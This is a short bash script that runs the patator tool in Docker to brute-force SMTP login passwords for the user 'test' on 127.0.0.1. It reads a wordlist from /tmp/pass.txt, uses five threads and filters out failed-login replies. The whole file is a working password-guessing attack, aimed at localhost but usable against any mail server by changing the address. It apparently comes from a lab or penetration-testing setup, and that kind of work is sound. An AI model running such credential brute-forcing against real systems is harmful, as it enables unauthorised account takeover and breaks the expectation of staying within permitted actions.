#!/usr/bin/env bash

pass='/tmp/pass.txt'
ip='127.0.0.1'
ignore='incorrect password or account name'

docker run --rm -it -v $pass:/F0 \
patator smtp_login host=$ip user='test' password=FILE0 0=/F0 \
-x ignore:fgrep="$ignore" --threads=5
